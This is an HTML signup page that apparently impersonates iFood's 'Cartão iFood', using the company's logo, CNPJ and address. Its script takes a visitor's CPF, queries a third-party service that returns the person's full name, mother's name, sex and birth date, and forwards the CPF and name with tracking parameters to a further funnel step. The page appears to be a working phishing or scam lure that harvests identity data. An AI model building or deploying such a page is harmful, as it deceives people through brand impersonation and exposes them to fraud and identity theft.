<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <title>Cadastro - Cartão iFood</title>

  data-utmify-prevent-subids

    <style>
        body {
            margin: 0;
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
            color: #333;
            text-align: center;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
            background-color: #EA1D2C;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        .header img {
            width: 120px;
            height: auto;
            filter: brightness(0) invert(1);
        }
        .content {
            padding: 30px 20px;
            max-width: 500px;
            margin: 0 auto;
        }
        h1 {
            font-family: 'Inter', sans-serif;
            color: #1c1c1c;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        label {
            font-family: 'Inter', sans-serif;
            color: #666;
            font-size: 16px;
            display: block;
            margin-bottom: 10px;
            text-align: left;
        }
        .cpf-input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            margin-bottom: 20px;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
            transition: border-color 0.3s ease;
        }
        .cpf-input:focus {
            outline: none;
            border-color: #EA1D2C;
        }
        .button {
            background-color: #EA1D2C;
            color: #ffffff;
            padding: 18px 30px;
            border-radius: 12px;
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            text-decoration: none;
            display: inline-block;
            text-align: center;
            box-sizing: border-box;
            border: none;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(234, 29, 44, 0.3);
        }
        .button:hover {
            background-color: #d11625;
            transform: translateY(-2px);
        }
        .notification-card {
            background-color: #ffeded;
            border: 2px solid #EA1D2C;
            color: #EA1D2C;
            padding: 15px 20px;
            border-radius: 10px;
            font-family: 'Inter', sans-serif;
            display: none;
            align-items: center;
            margin-bottom: 20px;
            text-align: left;
        }
        .notification-card i {
            margin-right: 10px;
            font-size: 18px;
        }
        .data-card {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            display: flex;
            align-items: center;
            text-align: left;
        }
        .data-card i {
            color: #EA1D2C;
            font-size: 20px;
            margin-right: 15px;
            width: 20px;
        }
        .data-label {
            color: #666;
            font-size: 13px;
            margin-bottom: 2px;
        }
        .data-value {
            color: #1c1c1c;
            font-size: 15px;
            font-weight: 600;
        }
        .success-icon {
            width: 60px;
            height: 60px;
            background: #e8f5e8;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
        }
        .success-title {
            color: #4CAF50;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/IFood_logo.svg/2560px-IFood_logo.svg.png" alt="Logo iFood">
    </div>

    <div class="content">
        <div id="primeiraParte">
            <h1>Preencha seus dados para cadastro</h1>
            
            <label for="cpf">CPF</label>
            <input type="text" id="cpf" class="cpf-input" placeholder="000.000.000-00" maxlength="14">

            <div id="notification" class="notification-card">
                <i class="fas fa-exclamation-circle"></i>
                <span id="notification-message"></span>
            </div>
            
            <button class="button" id="consultarBtn">Continuar</button>
        </div>
        
        <div id="resultadoModal" style="display: none;">
            <div class="success-icon">
                <i class="fas fa-check" style="color: #4CAF50; font-size: 24px;"></i>
            </div>
            <h3 class="success-title">Dados encontrados com sucesso!</h3>
            
            <div id="dadosContainer">
                <div class="data-card">
                    <i class="fas fa-user"></i>
                    <div>
                        <div class="data-label">Nome completo</div>
                        <div class="data-value" id="nomeResult"></div>
                    </div>
                </div>

                <div id="maeContainer" class="data-card">
                    <i class="fas fa-female"></i>
                    <div>
                        <div class="data-label">Nome da mãe</div>
                        <div class="data-value" id="maeResult"></div>
                    </div>
                </div>

                <div class="data-card">
                    <i class="fas fa-venus-mars"></i>
                    <div>
                        <div class="data-label">Sexo</div>
                        <div class="data-value" id="sexoResult"></div>
                    </div>
                </div>

                <div class="data-card">
                    <i class="fas fa-calendar"></i>
                    <div>
                        <div class="data-label">Data de nascimento</div>
                        <div class="data-value" id="nascimentoResult"></div>
                    </div>
                </div>
            </div>

            <button class="button" id="continuarBtn">
                Continuar
            </button>
        </div>
    </div>

    <footer style="padding: 15px; text-align: center; background-color: #f8f9fa; border-top: 1px solid #eaeaea; font-family: 'Inter', sans-serif;">
        <div style="max-width: 600px; margin: 0 auto;">
            <p style="color: #777; font-size: 11px; margin-bottom: 5px; line-height: 1.3;">
                iFood.com Agência de Restaurantes Online S.A. | CNPJ: 14.380.200/0001-21
            </p>
            <p style="color: #777; font-size: 11px; margin-bottom: 5px; line-height: 1.3;">
                Rua Jasmin, 660 - Vila Madalena, São Paulo - SP, 05042-001
            </p>
            <p style="color: #999; font-size: 10px; margin-top: 8px;">
                © 2025 - Todos os direitos reservados
            </p>
        </div>
    </footer>

    <script>
        // Função para mostrar notificação
        function showNotification(message) {
            const notification = document.getElementById('notification');
            const notificationMessage = document.getElementById('notification-message');
            
            notificationMessage.textContent = message;
            notification.style.display = 'flex';
            
            // Esconder após 3 segundos
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        // Função para obter parâmetros da URL
        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams) {
                params[key] = value;
            }
            return params;
        }
    
        // Função para construir URL com parâmetros
        function buildUrlWithParams(baseUrl) {
            const params = getUrlParams();
            const url = new URL(baseUrl, window.location.href);
            
            Object.keys(params).forEach(key => {
                url.searchParams.append(key, params[key]);
            });
            
            return url.toString();
        }

        // Função para formatar CPF enquanto digita
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('cpf').addEventListener('input', function (e) {
                let value = e.target.value;
                
                // Remove todos os caracteres não numéricos
                value = value.replace(/\D/g, '');
                
                // Formata o CPF
                if (value.length > 0) {
                    value = value.replace(/^(\d{3})(\d)/g, '$1.$2');
                    value = value.replace(/^(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3');
                    value = value.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/g, '$1.$2.$3-$4');
                }
                
                // Limita o tamanho
                if (value.length > 14) {
                    value = value.substring(0, 14);
                }
                
                e.target.value = value;
            });

            // Evento do botão consultar
            document.getElementById('consultarBtn').addEventListener('click', async function() {
                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
                const consultarBtn = document.getElementById('consultarBtn');
                
                if (cpf.length !== 11) {
                    showNotification('Por favor, insira um CPF válido');
                    return;
                }

                // Mostrar loading
                consultarBtn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Realizando cadastro';
                consultarBtn.disabled = true;

                try {
                    const url = `https://encurtaapi.com/api/typebot?cpf=${cpf}`;
                    const response = await fetch(url);
                    const data = await response.json();

                    if (response.ok) {
                        // Adaptar os dados para o formato esperado
                        const dadosUsuario = {
                            NOME: data.NOME,
                            MAE: data.MAE || '',
                            SEXO: data.SEXO,
                            NASCIMENTO: data.NASCIMENTO
                        };
                        
                        // Salvar dados no localStorage
                        localStorage.setItem('dadosUsuario', JSON.stringify(dadosUsuario));

                        // Preencher dados no modal
                        document.getElementById('nomeResult').textContent = dadosUsuario.NOME;
                        
                        // Verificar se tem nome da mãe e mostrar ou esconder o campo
                        if (dadosUsuario.MAE && dadosUsuario.MAE.trim() !== '') {
                            document.getElementById('maeResult').textContent = dadosUsuario.MAE;
                            document.getElementById('maeContainer').style.display = 'flex';
                        } else {
                            document.getElementById('maeContainer').style.display = 'none';
                        }
                        
                        document.getElementById('sexoResult').textContent = dadosUsuario.SEXO;
                        document.getElementById('nascimentoResult').textContent = dadosUsuario.NASCIMENTO;

                        // Mostrar modal
                        document.getElementById('resultadoModal').style.display = 'block';
                        document.getElementById('primeiraParte').style.display = 'none';
                    } else {
                        showNotification('CPF não encontrado');
                        consultarBtn.innerHTML = 'Continuar';
                        consultarBtn.disabled = false;
                    }
                } catch (error) {
                    showNotification('Erro ao consultar CPF. Tente novamente.');
                    consultarBtn.innerHTML = 'Continuar';
                    consultarBtn.disabled = false;
                }
            });

            // Evento do botão continuar no modal
            document.getElementById('continuarBtn').addEventListener('click', function() {
                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
                const params = getUrlParams();
                params.document = cpf;

                // Adiciona o nome completo aos parâmetros
                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
                if (dadosUsuario && dadosUsuario.NOME) {
                    params.name = dadosUsuario.NOME;
                }

                const url = new URL('/5/', window.location.href);
                Object.keys(params).forEach(key => {
                    url.searchParams.append(key, params[key]);
                });
                window.location.href = url.toString();
            });
        });
    </script>
</body>
</html>
